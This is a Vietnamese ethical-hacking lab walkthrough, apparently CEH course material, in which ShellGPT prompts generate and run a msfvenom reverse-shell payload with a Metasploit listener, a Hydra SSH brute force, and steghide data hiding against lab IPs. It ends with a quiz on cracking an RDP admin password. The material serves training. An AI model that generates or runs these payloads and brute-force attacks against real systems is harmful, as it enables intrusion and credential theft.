Hack hệ thống bằng AI tận dụng các thuật toán tiên tiến để xác định và khai thác lỗ hổng một cách hiệu quả. Các công cụ AI tự động hóa các tác vụ như bẻ khóa mật khẩu, quét lỗ hổng và kỹ thuật xã hội, nâng cao khả năng của các tin tặc có đạo đức. Cách tiếp cận này cải thiện độ chính xác và tốc độ của thử nghiệm thâm nhập, đảm bảo đánh giá bảo mật mạnh mẽ và chiến lược giảm thiểu hiệu quả.

Nhiệm vụ 1: Thực hiện Hack hệ thống bằng ShellGPT

Việc sử dụng ShellGPT để hack hệ thống bao gồm việc tận dụng khả năng AI của nó để xác định và khai thác các lỗ hổng hệ thống. ShellGPT có thể tự động hóa các tác vụ như bẻ khóa mật khẩu, quét lỗ hổng và phát triển khai thác, nâng cao hiệu quả của các tin tặc có đạo đức. Nó cung cấp các công cụ tiên tiến để kiểm tra thâm nhập và bảo vệ hệ thống trước các mối đe dọa tiềm ẩn.

Các lệnh do ShellGPT tạo ra có thể khác nhau tùy thuộc vào lời nhắc được sử dụng và các công cụ có sẵn trên máy. Do các biến này, kết quả đầu ra do ShellGPT tạo ra có thể khác với kết quả hiển thị trong ảnh chụp màn hình. Những khác biệt này xuất phát từ tính chất năng động trong quá trình xử lý của AI và môi trường đa dạng mà nó hoạt động. Do đó, bạn có thể quan sát thấy sự khác biệt trong cú pháp lệnh, cách thực thi và kết quả khi thực hiện nhiệm vụ thí nghiệm này.

1.  Nhấp vào Bảo mật Parrot để chuyển sang máy Parrot và đăng nhập bằng kẻ tấn công/toor. Mở cửa sổ Terminal và thực thi sudo su để chạy chương trình với tư cách là người dùng root (Khi được nhắc, hãy nhập mật khẩu).[Parrot Security](https://labclient.labondemand.com/Instructions/9bd79016-86f2-4ae3-aefe-7c1241c9ac02)

> Mật khẩu bạn gõ sẽ không hiển thị.

2.  Chạy lệnh bash sgpt.sh để định cấu hình ShellGPT và khóa kích hoạt AI.

> Bạn có thể làm theo Hướng dẫn tải xuống Khóa kích hoạt AI của mình trong Mô-đun 00: Thiết lập bài lab CEH để lấy khóa kích hoạt AI. Ngoài ra, hãy làm theo hướng dẫn có trong tệp, Hướng dẫn tải xuống Khóa kích hoạt AI của bạn.pdf[Instructions to Download your AI Activation Key.pdf](https://labondemand.blob.core.windows.net/content/lab168799/instructions267937/Instructions%20to%20Download%20your%20AI%20Activation%20Key.pdf)

3.  Sau khi định cấu hình ShellGPT trong máy Parrot Security, trong cửa sổ terminal chạy sgpt \--shell \"Sử dụng msfvenom để tạo tải trọng TCP với lhost=10.10.1.13 và lport=444\" để tạo tải trọng bằng công cụ msfvenom.

> Trong lời nhắc, hãy nhập E và nhấn Enter để thực thi lệnh.

4.  Bạn có thể chạy lệnh ls để hiển thị danh sách các tệp trong thư mục và bạn có thể quan sát thấy một tệp có tên là payload.exe đã được tạo, như minh họa trong ảnh chụp màn hình.

5.  Chạy sgpt \--shell \"Sử dụng msfconsole để khởi động trình nghe với lhost=10.10.1.13 và lport=444\" để khởi tạo trình nghe trên LHOST và LPORT nhất định.

> Trong lời nhắc, hãy nhập E và nhấn Enter để thực thi lệnh.

6.  Msfconsole khởi chạy thành công trình nghe, như minh họa trong ảnh chụp màn hình.

> Vì chúng tôi không thực thi tải trọng trong máy của nạn nhân nên bạn sẽ không thể thiết lập bất kỳ phiên nào.

7.  Chạy lệnh exit để thoát msfconsole.

8.  Chạy sgpt \--shell \"Sử dụng Hydra để thực hiện SSH-bruteforce trên địa chỉ IP=10.10.1.9 bằng cách sử dụng các tệp tên người dùng.txt và mật khẩu.txt có sẵn tại vị trí /home/Attacker/Wordlist\" để thực hiện tấn công SSH-bruteforce trên máy mục tiêu.

> Trong lời nhắc, hãy nhập E và nhấn Enter để thực thi lệnh.

9.  Bằng cách sử dụng các tệp danh sách từ được cung cấp, Hydra bẻ khóa tên người dùng và mật khẩu SSH của máy mục tiêu (ở đây là 10.10.1.9), như minh họa trong ảnh chụp màn hình.

10. Chạy sgpt \--shell \"Thực hiện công nghệ mã hóa bằng steghide để ẩn văn bản \'Số tài khoản Thụy Sĩ của tôi là 232343435211113\' trong tệp hình ảnh cover.jpg với mật khẩu là \'1234\'\" để chứng minh kỹ thuật mã hóa hình ảnh. (ở đây, tệp cover.jpg được đặt tại /home/Attacker)

> Trong lời nhắc, hãy nhập E và nhấn Enter để thực thi lệnh.

11. Văn bản đã cho sẽ được nhúng vào tệp cover.jpg, như minh họa trong ảnh chụp màn hình.

12. Bây giờ, hãy điều hướng đến tệp /home/kẻ tấn công và nhấp đúp vào tệp cover.jpg để xem tệp hình ảnh.

13. Đóng tập tin hình ảnh và cửa sổ kẻ tấn công. Điều hướng trở lại cửa sổ terminal / dòng lệnh.

14. Bây giờ, chúng ta sẽ trích xuất văn bản ẩn từ tệp cover.jpg bằng cách thực thi sgpt \--shell \"Sử dụng steghide để trích xuất văn bản ẩn trong cover.jpg\".

> Trong lời nhắc, hãy nhập E và nhấn Enter để thực thi lệnh.

15. Trong lời nhắc Nhập cụm mật khẩu, hãy nhập 1234 và nhấn Enter.

16. Trong lời nhắc tiếp theo, hãy nhập y và nhấn Enter để tiếp tục.

17. Bạn có thể quan sát thấy dữ liệu được trích xuất được lưu trữ trong tệp secret.txt.

18. Bây giờ, hãy chạy lệnh pluma secret.txt để xem tệp dữ liệu được trích xuất.

19. Bạn có thể quan sát thấy dữ liệu được trích xuất giống với dữ liệu đầu vào được cung cấp ở Bước#9.

20. Ngoài các lệnh đã nói ở trên, bạn có thể sử dụng thêm lời nhắc ShellGPT để thực hiện hack hệ thống.

21. Điều này kết thúc phần minh họa thực hiện hack hệ thống bằng ShellGPT.

22. Đóng tất cả các cửa sổ đang mở và ghi lại tất cả thông tin thu được.

**Câu 6.6.1.1**

Trong máy Parrot Security, viết lời nhắc ShellGPT và thực thi nó để bẻ khóa mật khẩu RDP của Quản trị viên người dùng có trong máy Windows 11 bằng cách sử dụng tệp passs.txt có ở vị trí /home/kẻ tấn công. Nhập mật khẩu RDP đã crack của Admin.
